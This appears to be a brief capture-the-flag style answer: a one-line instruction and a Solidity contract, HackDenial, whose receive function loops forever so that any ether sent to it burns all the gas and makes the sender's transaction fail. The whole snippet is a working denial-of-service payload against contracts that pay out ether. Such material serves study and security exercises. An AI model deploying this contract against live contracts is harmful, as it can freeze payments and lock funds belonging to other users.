use a contract that consumes all the gas of the tx

```
contract HackDenial {
    receive() external payable {
        while(true){}
    }
}
```
